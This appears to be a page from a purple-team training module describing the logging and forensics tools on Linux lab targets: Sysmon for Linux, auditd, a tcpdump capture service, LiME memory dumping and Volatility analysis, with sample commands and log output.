<p>In this section, we will explore the logs and traffic captures available on Linux Purple module targets, as well as how to access and manage them. Logging and traffic monitoring are essential for identifying suspicious activity. The logging and forensic mechanisms configured on Linux Purple module targets are designed to generate detailed, highly verbose logs, supporting both real-time monitoring and historical analysis.</p>
<h3 id="event-logging">Event Logging</h3>
<p>Linux Purple module targets are equipped with verbose logging mechanisms to ensure comprehensive tracking and monitoring of system activities, including command execution, network connections, and security events. In this section, we will explore the various locations where these logs can be reviewed and accessed.</p>
<p><strong>Sysmon For Linux</strong></p>
<p><a href="https://github.com/microsoft/SysmonForLinux">Sysmon for Linux</a> is a tool that monitors and logs system activity, including process lifetimes, network connections, file system writes, and more. Sysmon works across reboots and uses advanced filtering to help identify malicious activity, as well as how intruders and malware operate on a network. Sysmon for Linux is part of <a href="https://learn.microsoft.com/en-us/sysinternals/">Sysinternals</a>. It is installed and configured on all Linux Purple module targets.</p>
<p>Sysmon logs are stored in the <code>syslog</code> directory (<code>/var/log/syslog</code>).</p>
<p>&#x20; Linux Logs &amp; Traffic Captured</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cat <span class="hljs-meta-keyword">/var/</span>log/syslog | <span class="hljs-meta-keyword">/opt/</span>sysmon/sysmonLogView
<span class="hljs-params">&lt;SNIP&gt;</span>
Event SYSMONEVENT_SERVICE_CONFIGURATION_CHANGE
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43.427</span>
<span class="hljs-symbol">    Configuration:</span> collect-all.xml
<span class="hljs-symbol">    ConfigurationFileHash:</span> -
Event SYSMONEVENT_SERVICE_STATE_CHANGE
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43.432</span>
<span class="hljs-symbol">    State:</span> Started
<span class="hljs-symbol">    Version:</span> <span class="hljs-number">1.3</span><span class="hljs-number">.3</span>
<span class="hljs-symbol">    SchemaVersion:</span> <span class="hljs-number">4.81</span>
Event SYSMONEVENT_FILE_DELETE
<span class="hljs-symbol">    RuleName:</span> -
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43.415</span>
<span class="hljs-symbol">    ProcessGuid:</span> {<span class="hljs-number">00000000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-000000000000</span>}
<span class="hljs-symbol">    ProcessId:</span> <span class="hljs-number">768</span>
<span class="hljs-symbol">    User:</span> -
<span class="hljs-symbol">    Image:</span> <span class="hljs-meta-keyword">/usr/</span>usr<span class="hljs-meta-keyword">/sbin/</span>logrotate
<span class="hljs-symbol">    TargetFilename:</span> <span class="hljs-meta-keyword">/var/</span>log/ubuntu-advantage.log<span class="hljs-number">.1</span>
<span class="hljs-symbol">    Hashes:</span> -
<span class="hljs-symbol">    IsExecutable:</span> -
<span class="hljs-symbol">    Archived:</span> -
Event SYSMONEVENT_FILE_CREATE
<span class="hljs-symbol">    RuleName:</span> -
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43.415</span>
<span class="hljs-symbol">    ProcessGuid:</span> {<span class="hljs-number">00000000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-000000000000</span>}
<span class="hljs-symbol">    ProcessId:</span> <span class="hljs-number">768</span>
<span class="hljs-symbol">    Image:</span> <span class="hljs-meta-keyword">/usr/</span>usr<span class="hljs-meta-keyword">/sbin/</span>logrotate
<span class="hljs-symbol">    TargetFilename:</span> <span class="hljs-meta-keyword">/var/</span>log/ubuntu-advantage.log
<span class="hljs-symbol">    CreationUtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43.415</span>
<span class="hljs-symbol">    User:</span> -
Event SYSMONEVENT_FILE_CREATE
<span class="hljs-symbol">    RuleName:</span> -
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43.415</span>
<span class="hljs-symbol">    ProcessGuid:</span> {<span class="hljs-number">00000000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-000000000000</span>}
<span class="hljs-symbol">    ProcessId:</span> <span class="hljs-number">768</span>
<span class="hljs-symbol">    Image:</span> <span class="hljs-meta-keyword">/usr/</span>usr<span class="hljs-meta-keyword">/sbin/</span>logrotate
<span class="hljs-symbol">    TargetFilename:</span> <span class="hljs-meta-keyword">/var/</span>log/ubuntu-advantage-timer.log<span class="hljs-number">.1</span>.gz
<span class="hljs-symbol">    CreationUtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43.415</span>
<span class="hljs-symbol">    User:</span> -
Event SYSMONEVENT_CREATE_PROCESS
<span class="hljs-symbol">    RuleName:</span> -
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43.415</span>
<span class="hljs-symbol">    ProcessGuid:</span> {<span class="hljs-number">97985f</span>39-d8f7<span class="hljs-number">-673e-19</span>d3<span class="hljs-number">-6</span>a139b550000}
<span class="hljs-symbol">    ProcessId:</span> <span class="hljs-number">1387</span>
<span class="hljs-symbol">    Image:</span> <span class="hljs-meta-keyword">/usr/</span>usr<span class="hljs-meta-keyword">/bin/</span>gzip
<span class="hljs-symbol">    FileVersion:</span> -
<span class="hljs-symbol">    Description:</span> -
<span class="hljs-symbol">    Product:</span> -
<span class="hljs-symbol">    Company:</span> -
<span class="hljs-symbol">    OriginalFileName:</span> -
<span class="hljs-symbol">    CommandLine:</span> <span class="hljs-meta-keyword">/bin/</span>gzip
<span class="hljs-symbol">    CurrentDirectory:</span> /
<span class="hljs-symbol">    User:</span> root
<span class="hljs-symbol">    LogonGuid:</span> {<span class="hljs-number">97985f</span>39<span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-000000000000</span>}
<span class="hljs-symbol">    LogonId:</span> <span class="hljs-number">0</span>
<span class="hljs-symbol">    TerminalSessionId:</span> <span class="hljs-number">4294967295</span>
<span class="hljs-symbol">    IntegrityLevel:</span> no level
<span class="hljs-symbol">    Hashes:</span> -
<span class="hljs-symbol">    ParentProcessGuid:</span> {<span class="hljs-number">00000000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-000000000000</span>}
<span class="hljs-symbol">    ParentProcessId:</span> <span class="hljs-number">768</span>
<span class="hljs-symbol">    ParentImage:</span> -
<span class="hljs-symbol">    ParentCommandLine:</span> -
<span class="hljs-symbol">    ParentUser:</span> -
Event SYSMONEVENT_PROCESS_TERMINATE
<span class="hljs-symbol">    RuleName:</span> -
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43.424</span>
<span class="hljs-symbol">    ProcessGuid:</span> {<span class="hljs-number">97985f</span>39-d8f7<span class="hljs-number">-673e-19</span>d3<span class="hljs-number">-6</span>a139b550000}
<span class="hljs-symbol">    ProcessId:</span> <span class="hljs-number">1387</span>
<span class="hljs-symbol">    Image:</span> <span class="hljs-meta-keyword">/usr/</span>usr<span class="hljs-meta-keyword">/bin/</span>gzip
<span class="hljs-symbol">    User:</span> root
Event SYSMONEVENT_FILE_DELETE
<span class="hljs-symbol">    RuleName:</span> -
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43.431</span>
<span class="hljs-symbol">    ProcessGuid:</span> {<span class="hljs-number">00000000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-0000</span><span class="hljs-number">-000000000000</span>}
<span class="hljs-symbol">    ProcessId:</span> <span class="hljs-number">768</span>
<span class="hljs-symbol">    User:</span> -
<span class="hljs-symbol">    Image:</span> <span class="hljs-meta-keyword">/usr/</span>usr<span class="hljs-meta-keyword">/sbin/</span>logrotate
<span class="hljs-symbol">    TargetFilename:</span> <span class="hljs-meta-keyword">/var/</span>log/ubuntu-advantage-timer.log<span class="hljs-number">.1</span>
<span class="hljs-symbol">    Hashes:</span> -
<span class="hljs-symbol">    IsExecutable:</span> -
<span class="hljs-symbol">    Archived:</span> -
Event SYSMONEVENT_PROCESS_TERMINATE
<span class="hljs-symbol">    RuleName:</span> -
<span class="hljs-symbol">    UtcTime:</span> <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">43.439</span>
<span class="hljs-symbol">    ProcessGuid:</span> {<span class="hljs-number">97985f</span>39-d8e6<span class="hljs-number">-673e-8</span>d05<span class="hljs-number">-4</span>d4f4e560000}
<span class="hljs-symbol">    ProcessId:</span> <span class="hljs-number">1</span>
<span class="hljs-symbol">    Image:</span> <span class="hljs-meta-keyword">/usr/</span>lib<span class="hljs-meta-keyword">/systemd/</span>systemd
<span class="hljs-params">&lt;SNIP&gt;</span>
</code></pre>
<p><strong>Note</strong>: The Sysmon configuration file in use is located at <code>/opt/sysmon/config.xml</code> (as referenced <a href="https://github.com/microsoft/MSTIC-Sysmon/blob/main/linux/configs/collect-all.xml">here</a>). We can specify and apply our own Sysmon configuration before initiating the attack part of each section by modifying the <code>config.xml</code> file and running the following command to (re)start Sysmon with the specified configuration.</p>
<p>&#x20; Linux Logs &amp; Traffic Captured</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ sysmon -accepteula -c /opt</span><span class="hljs-regexp">/sysmon/config</span>.xml
</code></pre>
<p><strong>Auditd</strong></p>
<p>The Linux Audit Daemon (<code>auditd</code>) is the user-space component of the Linux Auditing System, designed to collect, process, and record audit log events to disk. It plays a critical role in security monitoring and compliance by maintaining a detailed log of system activities, including file access, user actions, and system calls. These logs are invaluable for identifying potential security breaches, investigating incidents, and ensuring compliance with regulatory requirements.</p>
<p><code>auditd</code> is installed and configured on all Linux Purple module targets.</p>
<p>The logs generated by <code>auditd</code> are saved by default at:</p>
<p><code>/var/log/audit/audit.log</code></p>
<p><strong>Notes</strong>:</p>
<ul>
<li>The <code>auditd.conf</code> configuration file in use is located at <code>/etc/audit/auditd.conf</code></li>
<li>Auditd rules <code>audit.rules</code> are located at <code>/etc/audit/audit.rules</code> (taken from <a href="https://github.com/Neo23x0/auditd/blob/master/audit.rules">here</a>)</li>
</ul>
<p><code>auditd</code> logs are often reviewed using tools like <code>ausearch</code> or <code>aureport</code> for efficient analysis and reporting.</p>
<p>The command below shows an example.</p>
<p>&#x20; Linux Logs &amp; Traffic Captured</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ausearch -k rootcmd -i
----
<span class="hljs-attr">type=PROCTITLE</span> <span class="hljs-attr">msg=audit(10/04/2024</span> <span class="hljs-number">16</span>:<span class="hljs-number">31</span>:<span class="hljs-number">50.464</span>:<span class="hljs-number">387</span>) : <span class="hljs-attr">proctitle=/sbin/auditctl</span> -R /etc/audit/audit.rules 
<span class="hljs-attr">type=SOCKADDR</span> <span class="hljs-attr">msg=audit(10/04/2024</span> <span class="hljs-number">16</span>:<span class="hljs-number">31</span>:<span class="hljs-number">50.464</span>:<span class="hljs-number">387</span>) : <span class="hljs-attr">saddr={</span> <span class="hljs-attr">saddr_fam=netlink</span> <span class="hljs-attr">nlnk-fam=16</span> <span class="hljs-attr">nlnk-pid=0</span> } 
<span class="hljs-attr">type=SYSCALL</span> <span class="hljs-attr">msg=audit(10/04/2024</span> <span class="hljs-number">16</span>:<span class="hljs-number">31</span>:<span class="hljs-number">50.464</span>:<span class="hljs-number">387</span>) : <span class="hljs-attr">arch=x86_64</span> <span class="hljs-attr">syscall=sendto</span> <span class="hljs-attr">success=yes</span> <span class="hljs-attr">exit=1064</span> <span class="hljs-attr">a0=0x3</span> <span class="hljs-attr">a1=0x7ffd18a02030</span> <span class="hljs-attr">a2=0x428</span> <span class="hljs-attr">a3=0x0</span> <span class="hljs-attr">items=0</span> <span class="hljs-attr">ppid=731</span> <span class="hljs-attr">pid=744</span> <span class="hljs-attr">auid=unset</span> <span class="hljs-attr">uid=root</span> <span class="hljs-attr">gid=root</span> <span class="hljs-attr">euid=root</span> <span class="hljs-attr">suid=root</span> <span class="hljs-attr">fsuid=root</span> <span class="hljs-attr">egid=root</span> <span class="hljs-attr">sgid=root</span> <span class="hljs-attr">fsgid=root</span> <span class="hljs-attr">tty=(none)</span> <span class="hljs-attr">ses=unset</span> <span class="hljs-attr">comm=auditctl</span> <span class="hljs-attr">exe=/usr/sbin/auditctl</span> <span class="hljs-attr">subj=unconfined</span> <span class="hljs-attr">key=(null)</span> 
<span class="hljs-attr">type=CONFIG_CHANGE</span> <span class="hljs-attr">msg=audit(10/04/2024</span> <span class="hljs-number">16</span>:<span class="hljs-number">31</span>:<span class="hljs-number">50.464</span>:<span class="hljs-number">387</span>) : <span class="hljs-attr">auid=unset</span> <span class="hljs-attr">ses=unset</span> <span class="hljs-attr">subj=unconfined</span> <span class="hljs-attr">op=add_rule</span> <span class="hljs-attr">key=rootcmd</span> <span class="hljs-attr">list=exit</span> <span class="hljs-attr">res=yes</span>
</code></pre>
<hr>
<h3 id="traffic-capturing">Traffic Capturing</h3>
<p>The <code>tcpdump</code> tool is used to capture and analyze network traffic on all Linux Purple module targets. It is configured as a systemd service, and all captured traffic is saved in the <code>/tmp</code> directory. These files can be analyzed using tools like <code>Wireshark</code> or <code>tcpdump</code> itself.</p>
<p>&#x20; Linux Logs &amp; Traffic Captured</p>
<pre><code class="lang-shell-session"><span class="hljs-string">root@</span><span class="hljs-string">htb[</span>/<span class="hljs-string">htb]</span>$ <span class="hljs-string">systemctl </span><span class="hljs-built_in">list-units</span> <span class="hljs-built_in">--type=service</span> | <span class="hljs-string">grep </span><span class="hljs-string">tcpdump
</span>
<span class="hljs-string">tcpdump.</span><span class="hljs-string">service </span>                   <span class="hljs-string">loaded </span><span class="hljs-string">active </span><span class="hljs-string">running </span><span class="hljs-string">"Systemd script for tcpdump"</span>
</code></pre>
<p>&#x20; Linux Logs &amp; Traffic Captured</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls /tmp/*pcap
/tmp/tcp_dump_2024<span class="hljs-string">-10</span><span class="hljs-string">-04</span><span class="hljs-string">-16</span>:31:52.pcap
</code></pre>
<p>To manage these <code>.pcap</code> files efficiently, the service must first be stopped. The capture files can then be retrieved, and the service restarted to resume the traffic capturing process.</p>
<ol>
<li>To stop the <code>tcpdump</code> service and access the <code>.pcap</code> files safely, the following command should be run.</li>
</ol>
<p>&#x20; Linux Logs &amp; Traffic Captured</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo systemctl stop tcpdump.service
</code></pre>
<ol>
<li>Once the service is stopped, the <code>.pcap</code> files located in the <code>/tmp</code> directory can be accessed. These files are named according to the timestamp corresponding to when the capture began.</li>
</ol>
<p>&#x20; Linux Logs &amp; Traffic Captured</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ls /tmp/*.pcap -lah

-rw-r--r-- 1 tcpdump tcpdump 9.4M Oct  7 08:41 /tmp/tcp_dump_2023<span class="hljs-string">-10</span><span class="hljs-string">-07</span><span class="hljs-string">-07</span>:57:24.pcap
</code></pre>
<p><code>*.pcap</code> or <code>*.pcap.gz</code> files will exist in the <code>/tmp</code> directory.</p>
<ol>
<li>After retrieving the .pcap files, the <code>tcpdump</code> service can be restarted to resume capturing traffic as follows.</li>
</ol>
<p>&#x20; Linux Logs &amp; Traffic Captured</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo systemctl start tcpdump.service
</code></pre>
<p>To verify that the service is running properly after restarting, use the following command.</p>
<p>&#x20; Linux Logs &amp; Traffic Captured</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo systemctl status tcpdump.service
 tcpdump.service - <span class="hljs-string">"Systemd script for tcpdump"</span>
<span class="hljs-symbol">     Loaded:</span> loaded (<span class="hljs-meta-keyword">/etc/</span>systemd<span class="hljs-meta-keyword">/system/</span>tcpdump.service; enabled; vendor prese&gt;
<span class="hljs-symbol">     Active:</span> active (running) since Thu <span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">35</span> UTC; <span class="hljs-number">3</span>h <span class="hljs-number">35</span>min ago
   Main PID: <span class="hljs-number">916</span> (tcpdump)
<span class="hljs-symbol">      Tasks:</span> <span class="hljs-number">1</span> (limit: <span class="hljs-number">4570</span>)
<span class="hljs-symbol">     Memory:</span> <span class="hljs-number">31.4</span>M
<span class="hljs-symbol">        CPU:</span> <span class="hljs-number">1.169</span>s
<span class="hljs-symbol">     CGroup:</span> /system.slice/tcpdump.service
             <span class="hljs-number">916</span> <span class="hljs-meta-keyword">/usr/</span>bin/tcpdump -i ens160 -C <span class="hljs-number">100</span> -G <span class="hljs-number">86400</span> -w <span class="hljs-meta-keyword">/tmp/</span>tcp_dump_&gt;

Nov <span class="hljs-number">21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">35</span> ubuntu systemd[<span class="hljs-number">1</span>]: Started <span class="hljs-string">"Systemd script for tcpdump"</span>.
Nov <span class="hljs-number">21</span> <span class="hljs-number">06</span>:<span class="hljs-number">53</span>:<span class="hljs-number">36</span> ubuntu bash[<span class="hljs-number">916</span>]: tcpdump: listening on ens160, link-type EN10M&gt;
lines <span class="hljs-number">1</span><span class="hljs-number">-12</span>/<span class="hljs-number">12</span> (END)
</code></pre>
<ol>
<li>Once we have captured traffic in a <code>.pcap</code> file, we can use <code>tcpdump</code> to analyze it directly on the same system without the need for additional tools. <code>Tcpdump</code> is a powerful command-line utility that allows us to inspect network traffic in various ways.</li>
</ol>
<p>For example, to focus specifically on DNS queries and responses, we can filter DNS traffic using <code>tcpdump</code> with the following command:</p>
<p>&#x20; Linux Logs &amp; Traffic Captured</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ tcpdump -nn -r tcp_dump_2023-<span class="hljs-number">10</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span>\:<span class="hljs-number">37</span>\:<span class="hljs-number">17.</span>pcap port <span class="hljs-number">53</span>

reading from file tcp_dump_2023-<span class="hljs-number">10</span>-<span class="hljs-number">07</span>-<span class="hljs-number">10</span>:<span class="hljs-number">37</span>:<span class="hljs-number">17.</span>pcap, link-type EN10MB (Ethernet), snapshot length <span class="hljs-number">262144</span>
<span class="hljs-number">10</span>:<span class="hljs-number">37</span>:<span class="hljs-number">37.737331</span> <span class="hljs-built_in">IP</span> <span class="hljs-number">10.129</span>.XXX.XX<span class="hljs-meta">.52092</span> &gt; <span class="hljs-number">1.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.53</span>: <span class="hljs-number">44868</span>+ [1au] A? api.snapcraft.io. (<span class="hljs-number">45</span>)
<span class="hljs-number">10</span>:<span class="hljs-number">37</span>:<span class="hljs-number">37.737832</span> <span class="hljs-built_in">IP</span> <span class="hljs-number">10.129</span>.XXX.XX<span class="hljs-meta">.44939</span> &gt; <span class="hljs-number">1.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.1</span><span class="hljs-meta">.53</span>: <span class="hljs-number">42940</span>+ [1au] AAAA? api.snapcraft.io. (<span class="hljs-number">45</span>)
...SNIP...
</code></pre>
<hr>
<h2 id="dumping-analyzing-linux-memory">Dumping &amp; Analyzing Linux Memory</h2>
<p>In this section, we&#39;ll explore the memory dumping and analysis tools available on Linux Purple module targets. These tools are essential for capturing and analyzing system memory to investigate security incidents and uncover potential threats.</p>
<h3 id="dumping-memory">Dumping Memory</h3>
<p>In all Linux Purple module targets, the <a href="https://github.com/504ensicsLabs/LiME">LiME</a> (Linux Memory Extractor) memory dumping tool is located at the following path:</p>
<p><code>/root/LiME/src/lime-5.15.0-71-generic.ko</code></p>
<p><code>LiME</code> is a powerful kernel module used for capturing volatile memory from Linux systems for forensic analysis. Capturing memory with <code>LiME</code> can be performed as follows.</p>
<p>&#x20; Dumping &amp; Analyzing Linux Memory</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cd /</span>root<span class="hljs-regexp">/LiME/</span>src/
root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo insmod lime-5.15.0-71-generic.ko "path=/</span>tmp/dump.mem format=lime<span class="hljs-string">"</span>
</code></pre>
<p>The memory dump will be saved in the following location: <code>/tmp/&lt;specified filename&gt;</code></p>
<h3 id="analyzing-memory">Analyzing Memory</h3>
<p>All Linux Purple module targets come pre-installed with <code>Volatility v2</code>. After capturing a memory dump from a Linux Purple module target, memory forensics could be performed using <code>Volatility v2</code> as follows (in this case, we are using Volatility&#39;s <code>linux_pslist</code> plugin to gather active tasks within the memory dump).</p>
<p>Please ensure that you specify the <code>LinuxUbuntu_5_15_0-71-generic_profilex64</code> profile when performing memory analysis with Volatility.</p>
<p>&#x20; Dumping &amp; Analyzing Linux Memory</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ cd /root/volatility-master
root@htb[/htb]$ python2.7 vol.py -f /tmp/dump.mem --profile=LinuxUbuntu_5_15_0<span class="hljs-string">-71</span>-generic_profilex64 linux_pslist
Volatility Foundation Volatility Framework 2.6.1
WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes
WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes
Offset             Name                 Pid             PPid            Uid             Gid    DTB                Start Time
------------------ -------------------- --------------- --------------- --------------- ------ ------------------ ----------
0xffff96e540210000 systemd              1               0               0               0      0x00000001024c2000 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540213280 kthreadd             2               0               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540214bc0 rcu_gp               3               2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540216500 rcu_par_gp           4               2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540211940 slub_flushwq         5               2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5402ecbc0 netns                6               2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5402e9940 kworker/0:0H         8               2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5402eb280 mm_percpu_wq         10              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540206500 rcu_tasks_rude_      11              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540201940 rcu_tasks_trace      12              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540200000 ksoftirqd/0          13              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540203280 rcu_sched            14              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540204bc0 migration/0          15              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e54020e500 idle_inject/0        16              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e54020b280 cpuhp/0              18              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e54020cbc0 cpuhp/1              19              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5402a9940 idle_inject/1        20              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5402a8000 migration/1          21              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5402ab280 ksoftirqd/1          22              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5402ae500 kworker/1:0H         24              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403b6500 kdevtmpfs            25              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403b1940 inet_frag_wq         26              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403b0000 kauditd              27              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403b3280 khungtaskd           28              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403b4bc0 oom_reaper           29              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403d0000 writeback            30              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403d3280 kcompactd0           31              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403d4bc0 ksmd                 32              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e5403d6500 khugepaged           33              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540a66500 kintegrityd          80              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540a61940 kblockd              81              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540a60000 blkcg_punt_bio       82              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540a5e500 tpm_dev_wq           83              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540a63280 ata_sff              84              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540a5cbc0 md                   85              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540a64bc0 edac-poller          86              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
0xffff96e540a5b280 devfreq_wq           87              2               0               0      ------------------ 2024<span class="hljs-string">-11</span><span class="hljs-string">-21</span> 12:53:33 UTC<span class="hljs-string">+0000</span>
